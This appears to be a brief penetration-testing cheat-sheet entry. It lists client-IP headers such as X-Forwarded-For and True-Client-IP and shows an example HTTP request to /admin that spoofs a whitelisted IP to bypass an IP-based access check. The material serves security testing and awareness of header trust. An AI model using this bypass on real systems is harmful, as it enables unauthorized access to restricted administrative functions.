## Multiple header

adding multiple headers in the request 

- `X-Forwarded-For`
- `X-Real-IP`
- `X-Originating-IP`
- `X-Client-IP`
- `Client-IP`
- `True-Client-IP`

eg: 

GET /admin HTTP/1.1
Host: [example.com](http://example.com/)
X-Forwarded-For: 203.0.113.5  ← Whitelisted IP (passes check!)
